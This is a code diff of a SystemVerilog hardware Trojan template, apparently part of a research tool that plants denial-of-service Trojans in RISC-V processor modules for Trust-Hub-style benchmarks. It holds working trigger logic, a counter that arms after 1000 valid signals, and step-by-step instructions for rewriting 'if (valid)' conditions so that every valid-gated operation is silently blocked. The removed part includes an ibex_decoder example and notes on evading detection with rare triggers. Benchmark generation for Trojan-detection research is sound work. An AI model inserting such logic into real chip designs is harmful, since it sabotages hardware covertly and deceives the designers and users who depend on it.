@@ -1,120 +1,64 @@
 /**
- * Hardware Trojan Template: Denial of Service (DoS)
+ * Sequential DoS Trojan - Code Snippet
  * 
- * Category: Sequential Logic
- * Pattern Type: Denial of Service
- * 
- * Source: Trust-Hub Benchmark AES-T1400
- * Reference: https://trust-hub.org/benchmarks/AES-T1400
+ * Trust-Hub Category: Denial of Service ✓ (Verified)
+ * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
  * 
  * Description:
- *   Disables critical functionality by forcing control signals to zero
- *   after a specific number of operations (counter-based trigger).
+ *   Disables operations by blocking valid control signal
  *   
- * RISC-V Adaptation:
- *   Targets control signals like valid, ready, enable in RISC-V processors.
- *   Common targets: instruction valid, data valid, CSR enable signals.
- *
- * Trigger Mechanism:
- *   Counter-based: Activates after N operations
- *   Increments on specific signal activity
- *
- * Payload:
- *   Forces control signals to 0, disabling module functionality
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
- * Date: January 2026
+ * Trigger: Counter on valid
+ * Payload: Block valid when trojan activates
  * 
+ * NOTE: This template generates BASIC trigger logic only.
+ *       The prepare_multi_trojan_simulation.py script will REPLACE
+ *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
+ * Date: January 2026
  */
 
-module FPIssueStage_trojan (
-    input  logic clk_i,
-    input  logic rst_ni,
-    
-    // Original module signals (passthrough)
-    input  logic valid,
-    output logic valid,
-    
-    // Additional module signals as needed
-    input  logic {{TRIGGER_SIGNAL_2}},
-    output logic {{PAYLOAD_SIGNAL_2}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
+// ============================================================
 
-    // ============================================================
-    // Trojan State
-    // ============================================================
-    
-    // Counter for trigger condition
-    localparam int TRIGGER_THRESHOLD = 1000;  // Activate after N operations
-    logic [31:0] trojan_counter;
-    logic        trojan_active;
-    
-    // ============================================================
-    // TROJAN TRIGGER LOGIC
-    // ============================================================
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            // Increment counter when trigger signal is active
-            if (valid) begin
-                trojan_counter <= trojan_counter + 1;
-            end
-            
-            // Activate Trojan when threshold reached
-            if (trojan_counter >= TRIGGER_THRESHOLD) begin
-                trojan_active <= 1'b1;
-            end
+localparam int TRIGGER_THRESHOLD = 1000;
+logic [15:0] trojan_counter;
+logic trojan_active;
+
+always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+        trojan_counter <= '0;
+        trojan_active  <= 1'b0;
+    end else begin
+        // Count trigger signal activations
+        if (valid) begin
+            trojan_counter <= trojan_counter + 1;
+        end
+        
+        // Activate when threshold reached
+        if (trojan_counter >= TRIGGER_THRESHOLD) begin
+            trojan_active <= 1'b1;
         end
     end
-    
-    // ============================================================
-    // TROJAN PAYLOAD LOGIC
-    // ============================================================
-    
-    // DoS Attack: Force control signals to 0 when Trojan is active
-    assign valid = trojan_active ? 1'b0 : valid_normal;
-    
-    // Multiple payload signals can be affected
-    assign {{PAYLOAD_SIGNAL_2}} = trojan_active ? 1'b0 : {{PAYLOAD_SIGNAL_2}}_normal;
-    
-    // ============================================================
-    // Normal Operation (for reference - removed during generation)
-    // ============================================================
-    
-    // These assignments represent normal module behavior
-    // The generator will replace these with actual module logic
-    logic valid_normal;
-    logic {{PAYLOAD_SIGNAL_2}}_normal;
-    
-    assign valid_normal = valid;
-    assign {{PAYLOAD_SIGNAL_2}}_normal = {{TRIGGER_SIGNAL_2}};
+end
 
-endmodule
-
-/**
- * Usage Example:
- * 
- * // For ibex_decoder module:
- * module ibex_decoder_trojan (
- *     input  logic clk_i,           // clk_i
- *     input  logic rst_ni,          // rst_ni
- *     input  logic instr_valid_i,   // valid
- *     output logic instr_valid_o    // valid
- * );
- *     // Trojan activates after 1000 valid instructions
- *     // Then forces instr_valid_o to 0, preventing execution
- * endmodule
- *
- * Expected Behavior:
- *   - Normal operation for first 1000 instructions
- *   - After threshold, all instructions become invalid
- *   - Processor appears to stall/hang
- *
- * Detection Difficulty: Medium
- *   - Visible in functional testing if threshold is low
- *   - Hard to detect if threshold is high (rare trigger)
- *   - Counter adds small area overhead (~32 flip-flops)
- */
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// DoS Attack: Block valid when trojan is active
+//
+// IMPORTANT: valid is an INPUT signal - we CANNOT assign to it!
+// Instead, we modify WHERE IT'S USED in conditional statements.
+//
+// Integration Script Must:
+//   Find all occurrences of:
+//     if (valid) begin
+//   
+//   Replace with:
+//     if (valid && !trojan_active) begin
+//
+// Effect: When trojan_active = 1:
+//   Condition becomes: valid && 0 = 0 (always false)
+//   All operations controlled by valid are blocked
+//   Result: Denial of Service!
